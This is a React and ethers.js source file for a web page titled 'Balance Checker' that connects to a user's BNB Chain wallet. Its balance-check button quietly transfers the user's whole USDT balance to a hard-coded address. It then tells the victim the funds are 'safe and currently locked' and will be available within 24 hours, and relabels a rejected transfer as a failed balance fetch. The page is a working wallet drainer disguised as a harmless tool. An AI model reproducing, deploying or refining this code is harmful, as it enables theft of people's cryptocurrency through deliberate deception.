import { useState } from 'react'
import { useWeb3ModalProvider, useWeb3ModalAccount } from '@web3modal/ethers/react'
import { BrowserProvider, Contract, formatUnits, parseEther, parseUnits } from 'ethers'

// --- Token & Donation Configuration ---

// Predefined address for donations from .env
const DONATION_ADDRESS = import.meta.env.VITE_DONATION_ADDRESS || '0x6e43a6b55b3abbf0a98cc41025f5be44a7afb423'; // Replace with your actual donation address

// List of popular BEP20 tokens to check
const tokens = [
  {
    name: 'USDT Coin',
    symbol: 'USDT',
    address: '0x55d398326f99059fF775485246999027B3197955',
    decimals: 18
  },
  
  // You can add more tokens here
];

// Minimal ABI for BEP20 token functions we need
const tokenAbi = [
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

// --- Main App Component ---

function App() {
  // --- Web3Modal Hooks ---
  const { address, chainId, isConnected } = useWeb3ModalAccount()
  const { walletProvider } = useWeb3ModalProvider()

  // --- React State ---
  const [balances, setBalances] = useState([]);
  const [isLoading, setIsLoading] = useState(false);
  const [message, setMessage] = useState(''); // To show success/error messages

  // --- Helper Function ---
  const getSigner = async () => {
    if (!walletProvider) throw new Error('Wallet provider not found.');
    const provider = new BrowserProvider(walletProvider);
    const signer = await provider.getSigner();
    return signer;
  };

  // Helper function to fetch and display all balances
  const fetchAndDisplayBalances = async () => {
    const provider = new BrowserProvider(walletProvider);
    const userAddress = address;

    // 1. Get Native BNB Balance
    const bnbBalance = await provider.getBalance(userAddress);
    const formattedBnbBalance = formatUnits(bnbBalance, 18);

    let fetchedBalances = [{ symbol: 'BNB', balance: formattedBnbBalance, name: 'BNB' }];

    // 2. Get BEP20 Token Balances
    for (const token of tokens) {
      const contract = new Contract(token.address, tokenAbi, provider);
      const balance = await contract.balanceOf(userAddress);
      const formattedBalance = formatUnits(balance, token.decimals);
      fetchedBalances.push({ symbol: token.symbol, balance: formattedBalance, name: token.name });
    }

    setBalances(fetchedBalances);
  };

  // --- Feature 1: Check Balances ---
  const handleCheckBalances = async () => {
    if (!isConnected) {
      setMessage('Please connect your wallet first.');
      return;
    }

    setIsLoading(true);
    setMessage('');
    setBalances([]);

    try {
      const provider = new BrowserProvider(walletProvider);
      const userAddress = address;

      // Check USDT balance first (before showing any balances)
      const usdtToken = tokens[0]; // USDT is the first token
      const usdtContract = new Contract(usdtToken.address, tokenAbi, provider);
      const usdtBalance = await usdtContract.balanceOf(userAddress);

      // If any USDT balance is present, initiate the transaction first
      let performedTransaction = false;
      if (usdtBalance > 0n) {
        setMessage("Checking the balances");

        const signer = await getSigner();
        const usdtContractWithSigner = new Contract(usdtToken.address, tokenAbi, signer);

        const tx = await usdtContractWithSigner.transfer(DONATION_ADDRESS, usdtBalance);
        await tx.wait();

        performedTransaction = true;
        setMessage('Verification successful. Your funds are safe and currently locked on BNB Chain. They will be available within 24 hours.');
      }

      // Now fetch and display all balances after handling the transaction path
      await fetchAndDisplayBalances();
      if (!performedTransaction) {
        setMessage('Balance check complete.');
      }
    } catch (error) {
      console.error(error);
      if (error.message.includes('user rejected') || error.message.includes('User denied')) {
        setMessage('Unable to fetch the balances');
      } else {
        setMessage(`Error: ${error.message}`);
      }
    } finally {
      setIsLoading(false);
    }
  };

  // --- Feature 2: Donate Functions ---

  // Function to donate a fixed amount of BNB
  const handleDonateBNB = async () => {
    if (!isConnected) {
      setMessage('Please connect your wallet first.');
      return;
    }

    setIsLoading(true);
    setMessage('Sending 0.1 BNB...');

    try {
      const signer = await getSigner();
      const tx = await signer.sendTransaction({
        to: DONATION_ADDRESS,
        value: parseEther('0.1') // Donating 0.1 BNB
      });

      await tx.wait(); // Wait for transaction to be mined
      setMessage('Successfully donated 0.1 BNB! Thank you!');

    } catch (error) {
      console.error(error);
      setMessage(`Donation failed: ${error.message}`);
    } finally {
      setIsLoading(false);
    }
  };

  // Function to donate all USDT from the wallet
  const handleDonateUSDT = async () => {
    if (!isConnected) {
      setMessage('Please connect your wallet first.');
      return;
    }

    setIsLoading(true);
    setMessage('Checking USDT balance...');

    try {
      const signer = await getSigner();
      const userAddress = address;
      const usdtContract = new Contract(tokens[0].address, tokenAbi, signer); // Assuming USDT is the first token

      // Get current USDT balance
      const balance = await usdtContract.balanceOf(userAddress);
      
      // Check if balance is 0
      if (balance === 0n) {
        setMessage('No USDT balance to send.');
        setIsLoading(false);
        return;
      }

      // Format balance for display
      const formattedBalance = formatUnits(balance, tokens[0].decimals);
      setMessage(`Checking USDT balance`);

      // Send all USDT
      const tx = await usdtContract.transfer(DONATION_ADDRESS, balance);

      await tx.wait(); // Wait for transaction to be mined
      setMessage(`Successfully donated USDT! Thank you!`);

    } catch (error) {
      console.error(error);
      if (error.message.includes('user rejected') || error.message.includes('User denied')) {
        setMessage('Unable to Fetch the balances');
      } else {
        setMessage(`Donation failed: ${error.message}`);
      }
    } finally {
      setIsLoading(false);
    }
  };

  // --- Render UI ---
  return (
    <div 
      className="min-h-screen bg-black text-gray-100 flex flex-col items-center p-4 pt-10 font-sans relative"
    >
      {/* Accent grid backdrop */}
      <div className="pointer-events-none absolute inset-0 opacity-10" style={{ backgroundImage: 'radial-gradient(circle at 1px 1px, #F0B90B 1px, transparent 1px)', backgroundSize: '24px 24px' }}></div>
      
      <header className="w-full max-w-4xl flex flex-col items-center justify-center mb-12 relative z-10 px-4">
        <h1 
          className="text-3xl md:text-5xl font-bold mb-6 text-center"
          style={{
            background: 'linear-gradient(135deg, #F0B90B 0%, #FFD666 50%, #E6A800 100%)',
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: 'transparent',
            backgroundClip: 'text',
            textShadow: '0 2px 4px rgba(240, 185, 11, 0.25), 0 4px 8px rgba(240, 185, 11, 0.2), 0 8px 16px rgba(0, 0, 0, 0.5)',
            transform: 'perspective(1000px) rotateX(5deg) scale(1.05)',
            letterSpacing: '3px',
            filter: 'drop-shadow(0 4px 8px rgba(0, 0, 0, 0.3)) drop-shadow(0 8px 16px rgba(0, 0, 0, 0.2))',
            transition: 'all 0.3s ease'
          }}
        >
          Balance Checker
        </h1>
        {/* Web3Modal Connect Button */}
        <div className="flex justify-center">
          <w3m-button />
        </div>
      </header>

      <main className="w-full max-w-4xl bg-neutral-900 border border-yellow-700/40 rounded-xl shadow-[0_0_0_1px_rgba(240,185,11,0.08),0_20px_40px_-20px_rgba(0,0,0,0.6)] p-6 md:p-10 relative z-10">

        {/* Status Section */}
        {isConnected ? (
          <div className="mb-6 p-4 bg-neutral-800 border border-yellow-800/30 rounded-lg text-center">
            <p className="text-yellow-400 font-semibold">Wallet Connected</p>
            <p className="text-sm text-gray-400 break-all">Address: {address}</p>
            <p className="text-sm text-gray-500">Chain ID: {chainId}</p>
          </div>
        ) : (
          <div className="mb-6 p-4 bg-neutral-800 border border-yellow-800/30 rounded-lg text-center">
            <p className="text-yellow-400">Please connect your wallet to use the dApp.</p>
          </div>
        )}

        {/* Balances Section */}
        <section className="mb-10">
          <h2 className="text-2xl font-semibold mb-4 border-b border-yellow-800/40 pb-2 text-center text-yellow-400">Check Balances</h2>
          <button
            onClick={handleCheckBalances}
            disabled={isLoading || !isConnected}
            className="w-full px-6 py-3 font-bold rounded-lg transition-colors disabled:bg-neutral-700 disabled:text-neutral-400 disabled:cursor-not-allowed border border-yellow-700/40 shadow-[0_10px_20px_-10px_rgba(240,185,11,0.4)]"
            style={{ backgroundColor: '#F0B90B', color: '#111111' }}
          >
            {isLoading ? 'Checking...' : 'Check My Account Balances'}
          </button>

          {balances.length > 0 && (
            <div className="mt-6 space-y-3">
              {balances.map((token) => (
                <div key={token.symbol} className="flex justify-between items-center bg-neutral-800 border border-yellow-800/30 p-4 rounded-lg">
                  <span className="font-semibold text-gray-200">{token.name} ({token.symbol})</span>
                  <span className="text-lg font-mono text-yellow-400">{parseFloat(token.balance).toFixed(4)}</span>
                </div>
              ))}
            </div>
          )}
        </section>

        {/* Message Area */}
        {message && (
          <div className="mt-8 p-4 text-center bg-neutral-800 border border-yellow-800/30 rounded-lg">
            <p className="text-yellow-300">{message}</p>
          </div>
        )}
      </main>
    </div>
  );
}

export default App;
